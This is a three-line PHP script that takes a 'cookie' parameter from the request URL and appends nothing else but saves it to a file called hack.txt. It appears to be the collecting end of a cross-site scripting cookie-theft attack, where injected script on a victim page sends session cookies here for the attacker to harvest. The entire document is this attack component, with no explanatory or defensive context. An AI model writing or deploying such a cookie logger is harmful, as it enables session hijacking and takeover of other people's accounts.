<?php 
$cookie = $_GET['cookie'];
file_put_contents("hack.txt", $cookie);
